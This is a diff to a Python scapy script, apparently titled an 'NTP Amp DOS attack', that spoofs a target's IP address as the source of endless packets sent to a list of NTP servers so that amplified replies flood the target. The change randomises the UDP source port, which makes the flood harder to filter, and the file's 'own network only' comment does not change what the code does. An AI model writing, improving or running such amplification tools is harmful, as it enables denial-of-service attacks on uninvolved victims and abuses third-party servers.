@@ -3,11 +3,13 @@ from scapy.all import *
 import sys
 import threading
 import time
+import random	# For Random source port
 #NTP Amp DOS attack
 #by DaRkReD
 #usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
 #FOR USE ON YOUR OWN NETWORK ONLY
 
+# Random source port added by JDMoore0883
 
 #packet sender
 def deny():
@@ -18,7 +20,7 @@ def deny():
 	global target
 	ntpserver = ntplist[currentserver] #Get new server
 	currentserver = currentserver + 1 #Increment for next 
-	packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
+	packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
 	send(packet,loop=1) #SEND IT
 
 #So I dont have to have the same stuff twice
